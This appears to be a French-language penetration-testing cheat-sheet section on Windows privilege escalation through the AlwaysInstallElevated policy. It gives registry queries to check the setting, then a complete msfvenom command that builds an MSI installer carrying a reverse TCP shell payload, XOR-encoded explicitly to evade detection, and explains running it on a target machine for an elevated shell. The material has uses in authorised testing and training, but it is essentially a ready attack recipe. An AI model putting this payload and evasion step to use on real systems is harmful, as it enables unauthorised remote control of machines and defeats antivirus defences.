#### Vérification du Paramètre `AlwaysInstallElevated`

- **Description :** Le paramètre `AlwaysInstallElevated` permet l'installation de programmes MSI avec des privilèges élevés sans requérir explicitement les droits d'administrateur. Si activé, il peut être exploité pour obtenir une élévation de privilège.
 
- **Commandes de Vérification :**

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Ces commandes vérifient si le paramètre est activé dans les registres HKCU (HKEY_CURRENT_USER) et HKLM (HKEY_LOCAL_MACHINE). Une réponse "0x1" indique que le paramètre est activé.  
 

#### Création d'un Reverse Shell avec MSFVenom

- **Commande :** `msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=6666 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi`  
    
- **Description :** Cette commande utilise MSFVenom pour créer un fichier MSI contenant un payload de reverse shell. Le fichier MSI peut ensuite être exécuté sur la machine cible pour obtenir un shell avec des privilèges élevés.
- **Détails :**
- `--platform windows` et `--arch x64` spécifient la plateforme et l'architecture cible.
- `--payload windows/x64/shell_reverse_tcp` définit le payload pour un reverse shell TCP.
- `LHOST=tun0` et `LPORT=6666` définissent l'adresse et le port de l'écouteur sur l'attaquant.
- `--encoder x64/xor` et `--iterations 9` appliquent un encodage pour échapper à la détection.
- `--format msi` spécifie le format de sortie comme MSI.
- `--out AlwaysInstallElevated.msi` nomme le fichier de sortie.


Exploitation

- **Exécution du Fichier MSI :** Une fois le fichier MSI créé, il peut être exécuté sur la machine cible. Si `AlwaysInstallElevated` est activé, le reverse shell sera lancé avec des privilèges élevés.